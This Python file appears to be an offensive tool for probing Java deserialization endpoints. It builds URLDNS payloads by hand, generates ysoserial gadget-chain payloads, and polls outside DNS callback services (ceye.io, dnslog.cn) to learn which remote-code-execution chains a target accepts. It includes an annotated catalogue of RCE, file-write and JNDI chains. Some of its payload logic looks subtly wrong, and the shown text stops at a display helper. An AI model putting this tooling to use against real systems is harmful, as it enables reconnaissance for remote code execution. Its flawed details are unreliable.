#!/usr/bin/env python3
"""
Java 反序列化组件检测工具 (DNS Exfiltration)
=============================================
通过 DNS 外带方式探测目标系统 Java 反序列化可利用的组件，
并根据检测结果推荐可用的 Gadget Chain 及其适用范围。

原理:
    每种 ysoserial Gadget Chain 依赖特定的第三方库/类。如果目标 Classpath 中
    存在这些类，反序列化该链的 payload 就会成功执行并触发 DNS 请求。
    本工具为每条链生成携带唯一 DNS 子域名的 payload，通过监控 DNS 回连
    来判断哪些组件可用。

支持的检测链:
    URLDNS, CommonsCollections1~7, CommonsBeanutils1, Groovy1,
    Spring1/2, Hibernate1/2, ROME, Click1, Clojure, C3P0,
    Jdk7u21, Jdk8u20, MozillaRhino1/2, JSON1, Wicket1,
    BeanShell1, JavassistWeld1, Myfaces1/2, JBossInterceptors1

DNSLog 平台:
    - ceye.io (推荐): 注册获取 Identifier + API Token
    - dnslog.cn: 直接获取随机域名
    - interactsh: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    - 自定义: 提供你自己的 DNS 回调服务器地址

用法:
    交互式模式:
        python java_deser_detect.py --interactive

    单次检测模式:
        python java_deser_detect.py --dnslog ceye --token <token> --identifier <id>

    纯 URLDNS 验证 (无需第三方组件):
        python java_deser_detect.py --urldns <dns_callback_url>

作者: ladon
"""

import os
import sys
import json
import time
import struct
import base64
import hashlib
import random
import string
import argparse
import textwrap
import subprocess
import urllib.request
import urllib.parse
from io import BytesIO
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# ============================================================================
#  知识库: ysoserial Gadget Chain 与组件映射
# ============================================================================

@dataclass
class GadgetChain:
    """一条 Gadget Chain 的完整信息"""
    name: str                    # ysoserial 中的名称
    category: str                # 类别: RCE / FileRead / SSRF / JNDI / Info
    description: str             # 简短描述
    required_classes: List[str]  # 依赖的关键全限定类名
    required_libs: List[str]     # 依赖的库 (Maven G:A 格式)
    java_versions: str           # 适用的 JDK 版本
    risk: str                    # High / Medium / Low
    note: str = ""               # 补充说明
    alternatives: List[str] = field(default_factory=list)  # 同类可替代链


# ---- 完整的 Gadget Chain 知识库 ----
GADGET_CHAINS: Dict[str, GadgetChain] = {
    # === JDK 内置链 (无需第三方库) ===
    "URLDNS": GadgetChain(
        name="URLDNS",
        category="Info",
        description="DNS 探测链，无危害，用于验证反序列化端点是否存在",
        required_classes=["java.util.HashMap", "java.net.URL"],
        required_libs=["JDK (内置)"],
        java_versions="全版本",
        risk="Low",
        note="仅触发 DNS 查询，不执行命令。所有 JDK 均可用。",
    ),
    "Jdk7u21": GadgetChain(
        name="Jdk7u21",
        category="RCE",
        description="JDK 7u21 及以下版本内置链，无需第三方库即可 RCE",
        required_classes=["sun.reflect.annotation.AnnotationInvocationHandler",
                         "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"],
        required_libs=["JDK <= 7u21 (内置)"],
        java_versions="<= JDK 7u21",
        risk="High",
        note="Jdk7u21 是最著名的 JDK 内置反序列化利用链。",
    ),
    "Jdk8u20": GadgetChain(
        name="Jdk8u20",
        category="RCE",
        description="JDK 8u20 及以下版本内置链",
        required_classes=["java.beans.beancontext.BeanContextSupport"],
        required_libs=["JDK <= 8u20 (内置)"],
        java_versions="<= JDK 8u20",
        risk="High",
    ),
    "JRMPClient": GadgetChain(
        name="JRMPClient",
        category="JNDI",
        description="JRMP 客户端链，用于建立反向 JRMP 连接",
        required_classes=["sun.rmi.server.UnicastRef", "sun.rmi.transport.tcp.TCPEndpoint"],
        required_libs=["JDK (内置)"],
        java_versions="<= JDK 8 (高版本需特殊处理)",
        risk="High",
        alternatives=["JRMPListener"],
    ),

    # === Commons Collections 系列 ===
    "CommonsCollections1": GadgetChain(
        name="CommonsCollections1",
        category="RCE",
        description="Apache Commons Collections 3.x 经典链 (LazyMap + InvokerTransformer)",
        required_classes=["org.apache.commons.collections.Transformer",
                         "org.apache.commons.collections.functors.InvokerTransformer",
                         "org.apache.commons.collections.map.LazyMap"],
        required_libs=["commons-collections:commons-collections:3.1-3.2.1"],
        java_versions="<= JDK 8u71 (高版本 AnnotationInvocationHandler 不可用)",
        risk="High",
    ),
    "CommonsCollections2": GadgetChain(
        name="CommonsCollections2",
        category="RCE",
        description="Apache Commons Collections 4.x (PriorityQueue + TransformingComparator)",
        required_classes=["org.apache.commons.collections4.comparators.TransformingComparator",
                         "org.apache.commons.collections4.functors.InvokerTransformer"],
        required_libs=["org.apache.commons.collections4:commons-collections4:4.0"],
        java_versions="全版本? (无 JDK 版本限制)",
        risk="High",
        alternatives=["CommonsCollections4"],
    ),
    "CommonsCollections3": GadgetChain(
        name="CommonsCollections3",
        category="RCE",
        description="CC1 变体，使用 InstantiateTransformer + TrAXFilter 绕过",
        required_classes=["org.apache.commons.collections.functors.InstantiateTransformer",
                         "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"],
        required_libs=["commons-collections:commons-collections:3.x"],
        java_versions="<= JDK 8u71",
        risk="High",
    ),
    "CommonsCollections4": GadgetChain(
        name="CommonsCollections4",
        category="RCE",
        description="CC2 变体，使用 InstantiateTransformer + TrAXFilter",
        required_classes=["org.apache.commons.collections4.comparators.TransformingComparator",
                         "org.apache.commons.collections4.functors.InstantiateTransformer"],
        required_libs=["org.apache.commons.collections4:commons-collections4:4.0"],
        java_versions="全版本?",
        risk="High",
    ),
    "CommonsCollections5": GadgetChain(
        name="CommonsCollections5",
        category="RCE",
        description="CC1 变体，使用 BadAttributeValueExpException 入口",
        required_classes=["org.apache.commons.collections.functors.InvokerTransformer",
                         "javax.management.BadAttributeValueExpException"],
        required_libs=["commons-collections:commons-collections:3.x"],
        java_versions="全版本 (绕过 JDK 8u71+ 限制)",
        risk="High",
        alternatives=["CommonsCollections1"],
    ),
    "CommonsCollections6": GadgetChain(
        name="CommonsCollections6",
        category="RCE",
        description="CC1 变体，使用 HashSet 入口，兼容性最好的 CC 链",
        required_classes=["org.apache.commons.collections.functors.InvokerTransformer",
                         "org.apache.commons.collections.keyvalue.TiedMapEntry"],
        required_libs=["commons-collections:commons-collections:3.x"],
        java_versions="全版本",
        risk="High",
        alternatives=["CommonsCollections1", "CommonsCollections5", "CommonsCollections7"],
    ),
    "CommonsCollections7": GadgetChain(
        name="CommonsCollections7",
        category="RCE",
        description="CC1 变体，使用 Hashtable 入口",
        required_classes=["org.apache.commons.collections.functors.InvokerTransformer",
                         "org.apache.commons.collections.map.LazyMap"],
        required_libs=["commons-collections:commons-collections:3.x"],
        java_versions="全版本",
        risk="High",
    ),

    # === 其他常用库链 ===
    "CommonsBeanutils1": GadgetChain(
        name="CommonsBeanutils1",
        category="RCE",
        description="Apache Commons BeanUtils + Commons Collections 配合利用",
        required_classes=["org.apache.commons.beanutils.BeanComparator",
                         "org.apache.commons.collections.comparators.ComparableComparator"],
        required_libs=["commons-beanutils:commons-beanutils:1.9.x",
                       "commons-collections:commons-collections:3.x"],
        java_versions="全版本",
        risk="High",
        note="依赖 CC 3.x 的 ComparableComparator；Beanutils 1.9.4+ 需 shiro 特殊处理",
    ),
    "Groovy1": GadgetChain(
        name="Groovy1",
        category="RCE",
        description="Groovy ConvertedClosure + MethodClosure 利用链",
        required_classes=["org.codehaus.groovy.runtime.ConvertedClosure",
                         "org.codehaus.groovy.runtime.MethodClosure"],
        required_libs=["org.codehaus.groovy:groovy:2.x"],
        java_versions="全版本",
        risk="High",
    ),
    "Spring1": GadgetChain(
        name="Spring1",
        category="RCE",
        description="Spring Framework MethodInvokeTypeProvider 利用链",
        required_classes=["org.springframework.beans.factory.ObjectFactory",
                         "org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"],
        required_libs=["org.springframework:spring-beans:4.x",
                       "org.springframework:spring-core:4.x"],
        java_versions="全版本",
        risk="High",
        alternatives=["Spring2"],
    ),
    "Spring2": GadgetChain(
        name="Spring2",
        category="RCE",
        description="Spring Framework 第二条利用链 (JdkDynamicAopProxy)",
        required_classes=["org.springframework.aop.framework.JdkDynamicAopProxy",
                         "org.springframework.aop.framework.AdvisedSupport"],
        required_libs=["org.springframework:spring-aop:4.x/5.x",
                       "org.springframework:spring-core:4.x/5.x"],
        java_versions="全版本",
        risk="High",
        alternatives=["Spring1"],
    ),
    "Hibernate1": GadgetChain(
        name="Hibernate1",
        category="RCE",
        description="Hibernate BasicPropertyAccessor 利用链",
        required_classes=["org.hibernate.property.access.spi.GetterMethodImpl",
                         "org.hibernate.tuple.component.AbstractComponentTuplizer"],
        required_libs=["org.hibernate:hibernate-core:4.x/5.x"],
        java_versions="全版本",
        risk="High",
        alternatives=["Hibernate2"],
    ),
    "Hibernate2": GadgetChain(
        name="Hibernate2",
        category="RCE",
        description="Hibernate Jdbc4Connection + ComponentType 利用链",
        required_classes=["org.hibernate.type.ComponentType",
                         "org.hibernate.engine.jdbc.connections.internal.DriverManagerConnectionProviderImpl"],
        required_libs=["org.hibernate:hibernate-core:4.x/5.x"],
        java_versions="全版本",
        risk="High",
    ),
    "ROME": GadgetChain(
        name="ROME",
        category="RCE",
        description="ROME (RSS/Atom 解析库) ToStringBean 利用链",
        required_classes=["com.sun.syndication.feed.impl.ToStringBean",
                         "com.sun.syndication.feed.impl.ObjectBean"],
        required_libs=["rome:rome:1.0"],
        java_versions="全版本",
        risk="High",
    ),
    "Click1": GadgetChain(
        name="Click1",
        category="RCE",
        description="Apache Click 框架 ColumnComparator 利用链",
        required_classes=["org.apache.click.control.Column",
                         "org.apache.click.control.Table"],
        required_libs=["org.apache.click:click-nodeps:2.x"],
        java_versions="全版本",
        risk="High",
    ),
    "Clojure": GadgetChain(
        name="Clojure",
        category="RCE",
        description="Clojure 语言映射到 Java 反序列化利用",
        required_classes=["clojure.lang.PersistentArrayMap",
                         "clojure.core$constantly$fn__4614"],
        required_libs=["org.clojure:clojure:1.x"],
        java_versions="全版本",
        risk="Medium",
    ),
    "C3P0": GadgetChain(
        name="C3P0",
        category="JNDI",
        description="C3P0 数据库连接池 JNDI 注入链",
        required_classes=["com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase",
                         "com.mchange.v2.naming.ReferenceIndirector"],
        required_libs=["com.mchange:c3p0:0.9.x"],
        java_versions="全版本",
        risk="High",
        note="需要 JNDI 注入环境配合，可与 JNDIExploit 联动",
    ),
    "BeanShell1": GadgetChain(
        name="BeanShell1",
        category="RCE",
        description="BeanShell 脚本引擎利用链",
        required_classes=["bsh.Interpreter", "bsh.XThis"],
        required_libs=["org.beanshell:bsh:2.0b"],
        java_versions="全版本",
        risk="High",
        note="BeanShell 本身即可执行任意 Java 代码。",
    ),
    "JSON1": GadgetChain(
        name="JSON1",
        category="RCE",
        description="Fastjson/Jackson 反序列化链",
        required_classes=["com.alibaba.fastjson.JSON",
                         "com.alibaba.fastjson.parser.DefaultJSONParser"],
        required_libs=["com.alibaba:fastjson:1.2.x (< 1.2.68)"],
        java_versions="全版本",
        risk="High",
        note="通常配合 @type 或 JdbcRowSetImpl 使用；Jackson 也有类似链",
    ),
    "MozillaRhino1": GadgetChain(
        name="MozillaRhino1",
        category="RCE",
        description="Mozilla Rhino JS 引擎利用链",
        required_classes=["org.mozilla.javascript.NativeJavaObject",
                         "org.mozilla.javascript.Context"],
        required_libs=["org.mozilla:rhino:1.7.x"],
        java_versions="<= JDK 8 (Java 15+ 移除 Nashorn/Rhino)",
        risk="High",
        alternatives=["MozillaRhino2"],
    ),
    "MozillaRhino2": GadgetChain(
        name="MozillaRhino2",
        category="RCE",
        description="Rhino 第二条利用链",
        required_classes=["org.mozilla.javascript.ScriptableObject",
                         "org.mozilla.javascript.ContextFactory"],
        required_libs=["org.mozilla:rhino:1.7.x"],
        java_versions="<= JDK 8",
        risk="High",
        alternatives=["MozillaRhino1"],
    ),
    "Wicket1": GadgetChain(
        name="Wicket1",
        category="RCE",
        description="Apache Wicket DiskFileItem 利用链",
        required_classes=["org.apache.wicket.util.upload.DiskFileItem",
                         "org.apache.wicket.util.io.DeferredFileOutputStream"],
        required_libs=["org.apache.wicket:wicket-util:6.x/7.x/8.x"],
        java_versions="全版本",
        risk="High",
        note="通过文件上传写 shell 实现 RCE。",
    ),
    "Myfaces1": GadgetChain(
        name="Myfaces1",
        category="RCE",
        description="Apache MyFaces EL 表达式注入链",
        required_classes=["org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression"],
        required_libs=["org.apache.myfaces.core:myfaces-impl:2.x"],
        java_versions="全版本",
        risk="High",
        alternatives=["Myfaces2"],
    ),
    "Myfaces2": GadgetChain(
        name="Myfaces2",
        category="RCE",
        description="MyFaces 第二条利用链",
        required_classes=["org.apache.myfaces.el.convert.MethodExpressionToMethodBinding"],
        required_libs=["org.apache.myfaces.core:myfaces-impl:2.x"],
        java_versions="全版本",
        risk="High",
        alternatives=["Myfaces1"],
    ),
    "JavassistWeld1": GadgetChain(
        name="JavassistWeld1",
        category="RCE",
        description="Javassist + Weld 组合利用链",
        required_classes=["org.jboss.weld.interceptor.builder.InterceptionModelBuilder",
                         "javassist.util.proxy.MethodHandler"],
        required_libs=["org.javassist:javassist:3.x",
                       "org.jboss.weld:weld-core:2.x/3.x"],
        java_versions="全版本",
        risk="Medium",
    ),
    "JBossInterceptors1": GadgetChain(
        name="JBossInterceptors1",
        category="RCE",
        description="JBoss 拦截器利用链",
        required_classes=["org.jboss.interceptor.builder.InterceptionModelBuilder",
                         "org.jboss.interceptor.proxy.DirectClassInstanceCreator"],
        required_libs=["org.jboss.interceptor:jboss-interceptor:1.x"],
        java_versions="全版本",
        risk="High",
    ),
    "AspectJWeaver": GadgetChain(
        name="AspectJWeaver",
        category="FileWrite",
        description="AspectJ Weave 任意文件写入链",
        required_classes=["org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"],
        required_libs=["org.aspectj:aspectjweaver:1.x"],
        java_versions="全版本",
        risk="High",
        note="可向 classpath 目录写入恶意 .class 文件实现 RCE。",
    ),
    "FileUpload1": GadgetChain(
        name="FileUpload1",
        category="FileWrite",
        description="Apache Commons FileUpload DiskFileItem 写文件链",
        required_classes=["org.apache.commons.fileupload.disk.DiskFileItem"],
        required_libs=["commons-fileupload:commons-fileupload:1.x"],
        java_versions="全版本",
        risk="High",
    ),
}


# ---- 将关键类映射到链 (用于快速匹配) ----
CLASS_TO_CHAINS: Dict[str, List[str]] = {}
for chain_name, chain in GADGET_CHAINS.items():
    for cls in chain.required_classes:
        CLASS_TO_CHAINS.setdefault(cls, []).append(chain_name)


# ============================================================================
#  URLDNS Payload 生成器 (纯 Python，无需 Java/ysoserial)
# ============================================================================

# Java 序列化协议常量
JAVA_STREAM_MAGIC = 0xACED
JAVA_STREAM_VERSION = 5
TC_OBJECT = 0x73
TC_CLASSDESC = 0x72
TC_STRING = 0x74
TC_LONGSTRING = 0x7C
TC_REFERENCE = 0x71
TC_NULL = 0x70
TC_ENDBLOCKDATA = 0x78
TC_ARRAY = 0x75
TC_BLOCKDATA = 0x77
SC_SERIALIZABLE = 0x02
SC_WRITE_METHOD = 0x01


def _write_utf(data: BytesIO, s: str) -> None:
    """写入 Java 修改版 UTF-8 字符串"""
    encoded = s.encode("utf-8")
    data.write(struct.pack(">H", len(encoded)))
    data.write(encoded)


def _write_long_utf(data: BytesIO, s: str) -> None:
    """写入 Java 长 UTF-8 字符串"""
    encoded = s.encode("utf-8")
    data.write(struct.pack(">Q", len(encoded)))
    data.write(encoded)


def _make_class_desc(data: BytesIO, class_name: str, serial_version_uid: int,
                     flags: int, fields: List[Tuple[str, str, str]] = None,
                     parent_class: bytes = None,
                     annotations: List[bytes] = None) -> bytes:
    """构建 TC_CLASSDESC"""
    buf = BytesIO()
    buf.write(bytes([TC_CLASSDESC]))
    _write_utf(buf, class_name)
    buf.write(struct.pack(">Q", serial_version_uid))
    # 写入 handle (newHandle 由外部管理，这里占位后由调用方替换)
    # 这里我们直接生成不做 handle 管理，调用方需要处理
    buf.write(b'\x00\x00\x00\x02')  # placeholder handle
    # classDescFlags
    buf.write(bytes([flags]))
    # fields
    if fields is None:
        fields = []
    buf.write(struct.pack(">H", len(fields)))
    for field_type, field_name, _field_class in fields:
        buf.write(field_type.encode())
        _write_utf(buf, field_name)
        # 对于对象类型 field
        if field_type in ('L', '['):
            _write_utf(buf, _field_class)
    # classAnnotation
    if annotations is None:
        buf.write(bytes([TC_ENDBLOCKDATA]))
    else:
        for ann in annotations:
            buf.write(ann)
    # superClassDesc
    if parent_class is None:
        buf.write(bytes([TC_NULL]))
    else:
        buf.write(parent_class)
    return buf.getvalue()


def build_urldns_payload(dns_url: str) -> bytes:
    """
    构建 URLDNS 反序列化 payload (纯 Python 实现)
    不需要任何第三方库，仅依赖 JDK 内置的 HashMap + URL 类。

    工作原理:
        HashMap.readObject() → putVal() → hashCode()
        → URL.hashCode() → URLStreamHandler.getHostAddress()
        → InetAddress.getByName() → DNS 查询

    参数:
        dns_url: DNS 回调 URL (如 http://abc.ceye.io)

    返回:
        序列化后的二进制 payload bytes
    """
    buf = BytesIO()

    # ---- 写入序列化流头 ----
    buf.write(struct.pack(">H", JAVA_STREAM_MAGIC))
    buf.write(struct.pack(">H", JAVA_STREAM_VERSION))

    # ---- 构建 java.net.URL 对象 ----
    url_fields = [
        ("L", "protocol", "Ljava/lang/String;"),
        ("L", "host", "Ljava/lang/String;"),
        ("I", "port", ""),
        ("L", "file", "Ljava/lang/String;"),
        ("L", "authority", "Ljava/lang/String;"),
        ("L", "path", "Ljava/lang/String;"),
        ("L", "query", "Ljava/lang/String;"),
        ("L", "ref", "Ljava/lang/String;"),
        ("I", "hashCode", ""),
    ]

    parsed = urllib.parse.urlparse(dns_url)
    protocol = parsed.scheme or "http"
    host = parsed.hostname or ""
    port = parsed.port or -1
    file_part = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")

    url_buf = BytesIO()
    url_buf.write(bytes([TC_OBJECT]))

    # TC_CLASSDESC for java.net.URL
    url_buf.write(bytes([TC_CLASSDESC]))
    _write_utf(url_buf, "java.net.URL")
    url_buf.write(b'\xff\xff\xff\xff\xff\xff\xff\xff')   # serialVersionUID = -1
    url_buf.write(b'\x00\x00\x00\x01')                    # handle = 1
    url_buf.write(bytes([SC_SERIALIZABLE | SC_WRITE_METHOD]))
    url_buf.write(struct.pack(">H", len(url_fields)))
    for ft, fn, fc in url_fields:
        url_buf.write(ft.encode())
        _write_utf(url_buf, fn)
        if ft in ('L', '['):
            url_buf.write(bytes([TC_STRING]))
            _write_utf(url_buf, fc)
    url_buf.write(bytes([TC_ENDBLOCKDATA]))
    url_buf.write(bytes([TC_NULL]))   # no superclass

    # URL 字段值 (使用 writeObject/putFields 协议)
    url_buf.write(bytes([TC_BLOCKDATA, 0x08]))   # block data: 8 bytes
    url_buf.write(b'\x00\x00\x00\x00')            # defaultedFields = 0
    url_buf.write(b'\x00\x00\x00\x08')            # number of fields = 8 (不含 hashCode)
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, protocol)     # protocol
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, host)          # host
    url_buf.write(struct.pack(">i", port))                                # port
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, file_part)     # file
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, host)          # authority
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, file_part)     # path
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, parsed.query or "")  # query
    url_buf.write(bytes([TC_STRING])); _write_utf(url_buf, "")             # ref

    url_object_bytes = url_buf.getvalue()

    # ---- 构建 HashMap ----
    hm_buf = BytesIO()
    hm_buf.write(bytes([TC_OBJECT]))

    # HashMap TC_CLASSDESC
    hashmap_fields = [
        ("F", "loadFactor", ""),
        ("I", "threshold", ""),
    ]
    hm_buf.write(bytes([TC_CLASSDESC]))
    _write_utf(hm_buf, "java.util.HashMap")
    hm_buf.write(b'\x05\x07\xda\xc1\xc3\x16\x60\xd1')  # serialVersionUID
    hm_buf.write(b'\x00\x00\x00\x02')                    # handle = 2
    hm_buf.write(bytes([SC_SERIALIZABLE | SC_WRITE_METHOD]))
    hm_buf.write(struct.pack(">H", len(hashmap_fields)))
    for ft, fn, _ in hashmap_fields:
        hm_buf.write(ft.encode())
        _write_utf(hm_buf, fn)
    hm_buf.write(bytes([TC_ENDBLOCKDATA]))
    hm_buf.write(bytes([TC_NULL]))   # no super class

    # HashMap writeObject 字段值
    hm_buf.write(struct.pack(">f", 0.75))   # loadFactor
    hm_buf.write(struct.pack(">i", 2))       # threshold (capacity)

    # HashMap 存储的 entry (BLOCKDATA)
    hm_buf.write(bytes([TC_BLOCKDATA, 8]))
    hm_buf.write(struct.pack(">i", 1))       # size = 1
    hm_buf.write(struct.pack(">i", 2))       # capacity = 2
    # Entry: key = URL object (handle 1)
    hm_buf.write(url_object_bytes)
    # Entry: value = same URL object (reference to handle 1)
    hm_buf.write(bytes([TC_REFERENCE]))
    hm_buf.write(b'\x00\x00\x00\x01')        # handle = 1

    buf.write(hm_buf.getvalue())

    return buf.getvalue()


# ============================================================================
#  DNSLog 平台接口
# ============================================================================

class DNSLogBase:
    """DNSLog 平台基类"""
    def get_subdomain(self) -> str:
        raise NotImplementedError

    def poll_records(self, filter_str: str = "") -> List[str]:
        raise NotImplementedError


class CeyeDNSLog(DNSLogBase):
    """ceye.io 平台"""
    BASE = "http://api.ceye.io/v1/records"

    def __init__(self, identifier: str, token: str):
        self.identifier = identifier
        self.token = token

    def get_subdomain(self) -> str:
        return f"{self.identifier}.ceye.io"

    def poll_records(self, filter_str: str = "") -> List[str]:
        params = {"token": self.token, "type": "dns"}
        if filter_str:
            params["filter"] = filter_str
        url = f"{self.BASE}?{urllib.parse.urlencode(params)}"
        try:
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read())
            records = [r["name"] for r in data.get("data", [])]
            return records
        except Exception as e:
            print(f"  [!] ceye.io 查询失败: {e}")
            return []


class DNSLogCn(DNSLogBase):
    """dnslog.cn 平台 (无需认证)"""
    BASE = "http://www.dnslog.cn"

    def __init__(self):
        self.domain = ""
        self.cookie = ""
        self._get_domain()

    def _get_domain(self):
        try:
            req = urllib.request.Request(f"{self.BASE}/getdomain.php")
            resp = urllib.request.urlopen(req, timeout=10)
            self.domain = resp.read().decode().strip()
            self.cookie = resp.headers.get("Set-Cookie", "")
        except Exception as e:
            print(f"  [!] dnslog.cn 获取域名失败: {e}")

    def get_subdomain(self) -> str:
        return self.domain

    def poll_records(self, filter_str: str = "") -> List[str]:
        try:
            req = urllib.request.Request(f"{self.BASE}/getrecords.php")
            if self.cookie:
                req.add_header("Cookie", self.cookie)
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read())
            return [r[0] for r in data if filter_str in r[0]] if filter_str else [r[0] for r in data]
        except Exception as e:
            print(f"  [!] dnslog.cn 查询失败: {e}")
            return []


# ============================================================================
#  Payload 生成 (urldns 纯 Python / 其他链需要 ysoserial)
# ============================================================================

def check_java() -> bool:
    """检查 Java 是否可用"""
    try:
        result = subprocess.run(["java", "-version"], capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except FileNotFoundError:
        return False
    except Exception:
        return False


def check_ysoserial() -> Optional[str]:
    """检查 ysoserial.jar 是否可用，返回路径"""
    paths = [
        "ysoserial.jar",
        os.path.expanduser("~/tools/ysoserial.jar"),
        os.path.expanduser("~/ysoserial.jar"),
        "/opt/ysoserial/ysoserial.jar",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None


def generate_urldns_payload(dns_url: str) -> bytes:
    """生成 URLDNS payload"""
    return build_urldns_payload(dns_url)


def generate_chain_payload(chain_name: str, dns_url: str,
                           ysoserial_path: str = "ysoserial.jar") -> Optional[bytes]:
    """
    使用 ysoserial 生成特定链的 payload
    所有链的 payload 使用 URLDNS 作为测试载体，如果链可用的组件在 classpath 中，
    则反序列化成功并触发 DNS 请求。
    """
    if chain_name not in GADGET_CHAINS:
        print(f"  [!] 未知链: {chain_name}")
        return None

    cmd = f"http://{dns_url}"
    try:
        result = subprocess.run(
            ["java", "-jar", ysoserial_path, chain_name, cmd],
            capture_output=True, timeout=30
        )
        if result.returncode != 0:
            stderr = result.stderr.decode(errors="replace")
            # 某些链需要额外参数
            if "requires" in stderr.lower() or "argument" in stderr.lower():
                # 尝试不同命令格式
                pass
            return None
        return result.stdout

    except subprocess.TimeoutExpired:
        print(f"  [!] {chain_name} payload 生成超时")
        return None
    except FileNotFoundError:
        print(f"  [!] 找不到 java 命令")
        return None
    except Exception as e:
        print(f"  [!] {chain_name} payload 生成失败: {e}")
        return None


# ============================================================================
#  组件检测引擎
# ============================================================================

def generate_payload_files(dnslog: DNSLogBase, output_dir: str = "payloads",
                           ysoserial_path: Optional[str] = None) -> Dict[str, str]:
    """
    为每条链生成携带唯一 DNS 子域名的 payload 文件

    返回: {chain_name: payload_file_path}
    """
    os.makedirs(output_dir, exist_ok=True)
    payload_files = {}
    base_domain = dnslog.get_subdomain()

    for chain_name in GADGET_CHAINS:
        if chain_name == "URLDNS":
            # URLDNS 使用纯 Python 生成
            subdomain = f"urldns.{base_domain}"
            url = f"http://{subdomain}"
            try:
                raw = generate_urldns_payload(url)
                b64 = base64.b64encode(raw).decode()
                fname = os.path.join(output_dir, f"{chain_name}.bin")
                with open(fname, "wb") as f:
                    f.write(raw)
                fname_b64 = os.path.join(output_dir, f"{chain_name}.b64")
                with open(fname_b64, "w") as f:
                    f.write(b64)
                payload_files[chain_name] = fname
                print(f"  [+] {chain_name:25s} → {subdomain}")
            except Exception as e:
                print(f"  [!] {chain_name:25s} 生成失败: {e}")
        else:
            if not ysoserial_path:
                print(f"  [-] {chain_name:25s} 跳过 (需要 ysoserial.jar)")
                continue
            subdomain = f"{chain_name.lower()}.{base_domain}"
            url = f"http://{subdomain}"
            raw = generate_chain_payload(chain_name, url, ysoserial_path)
            if raw:
                fname = os.path.join(output_dir, f"{chain_name}.bin")
                with open(fname, "wb") as f:
                    f.write(raw)
                b64 = base64.b64encode(raw).decode()
                fname_b64 = os.path.join(output_dir, f"{chain_name}.b64")
                with open(fname_b64, "w") as f:
                    f.write(b64)
                payload_files[chain_name] = fname
                print(f"  [+] {chain_name:25s} → {subdomain}")
            else:
                print(f"  [!] {chain_name:25s} 生成失败 (可能缺少依赖)")

    print(f"\n  共生成 {len(payload_files)} 个 payload 文件 → {output_dir}/")
    return payload_files


def detect_components(dnslog: DNSLogBase, chain_names: List[str],
                      poll_interval: int = 3, max_wait: int = 60) -> Dict[str, bool]:
    """
    通过 DNS 回连检测哪些链的组件可用

    返回: {chain_name: detected}
    """
    detected = {}
    base_domain = dnslog.get_subdomain()

    print(f"\n  [*] 等待 DNS 回连 (最长 {max_wait}s)...")
    waited = 0
    while waited < max_wait:
        time.sleep(poll_interval)
        waited += poll_interval
        records = dnslog.poll_records()
        for chain_name in chain_names:
            subdomain = f"{chain_name.lower()}.{base_domain}"
            if chain_name == "URLDNS":
                subdomain = f"urldns.{base_domain}"

            for r in records:
                if subdomain in r:
                    detected[chain_name] = True

        print(f"  [*] 已等待 {waited}s, 已检出 {len(detected)} 条链")

    for chain_name in chain_names:
        if chain_name not in detected:
            detected[chain_name] = False

    return detected


# ============================================================================
#  交互式菜单
# ============================================================================

def color(text: str, code: str) -> str:
    """终端着色"""
    colors = {"red": "31", "green": "32", "yellow": "33", "blue": "34",
              "cyan": "36", "bold": "1", "reset": "0"}
    c = colors.get(code, "0")
    return f"\033[{c}m{text}\033[0m"


def print_banner():
    """打印工具横幅"""
    banner = r"""
  ___                       ____           _                
 |_ _|_ ____   __ ___  _   |  _ \  ___ ___| |_ ___ _ __     
  | || '_ \ \ / // _ \| |  | | | |/ _ / __| __/ _ \ '__|    
  | || | | \ V // (_) | |__| |_| |  __\__ \ ||  __/ |       
 |___|_| |_|\_/ \___/|____|____/ \___|___/\__\___|_|       
       ╔═══════════════════════════════════════════╗
       ║  Java 反序列化组件检测工具 (DNS Exfil)   ║
       ║          by ladon                         ║
       ╚═══════════════════════════════════════════╝
"""
    print(color(banner, "cyan"))


def show_detected_summary(detected: Dict[str, bool]):
    """展示检测结果摘要，按类别分组"""
    if not detected:
        print(color("\n  [-] 未检测到任何组件。", "red"))
        print("  提示: 确保 payload 已成功发送到目标，且 DNS 回连可达。")
        return

    print(color(f"\n  {'='*60}", "cyan"))
    print(color(f"  检测结果汇总 ({len([k for k,v in detected.items() if v])}/{len(detected)} 检出)", "bold"))

    categories = {"Info": [], "RCE": [], "FileWrite": [], "JNDI": [], "FileRead": []}
    for chain_name, is_detected in detected.items():
        if not is_detected:
            continue
        chain = GADGET_CHAINS.get(chain_name)
        if chain:
            categories.setdefault(chain.category, []).append(chain_name)

    for cat, chains in categories.items():
        if chains:
            cat_labels = {"RCE": "远程代码执行", "Info": "信息探测",
                         "FileWrite": "任意文件写入", "JNDI": "JNDI 注入",
                         "FileRead": "任意文件读取"}
            print(color(f"\n  ▸ {cat_labels.get(cat, cat)} ({len(chains)}条)", "yellow"))
            for cn in chains:
                c = GADGET_CHAINS[cn]
                print(f"    ✓ {color(cn, 'green'):30s} {c.description}")
                print(f"      JDK: {c.java_versions}  |  库: {', '.join(c.required_libs[:2])}")
                if c.alternatives:
                    print(f"      替代方案: {', '.join(c.alternatives)}")


def show_chain_details(chain_name: str):
    """展示单条链的详细信息"""
    if chain_name not in GADGET_CHAINS:
        print(f"  [!] 未知链: {chain_name}")
        return
    c = GADGET_CHAINS[chain_name]
    print(color(f"\n  {'─'*50}", "cyan"))
    print(color(f"  {c.name} - {c.category}", "bold"))
    print(f"  描述: {c.description}")
    print(f"  风险: {c.risk}")
    print(f"  JDK:  {c.java_versions}")
    print(f"  依赖库: {', '.join(c.required_libs)}")
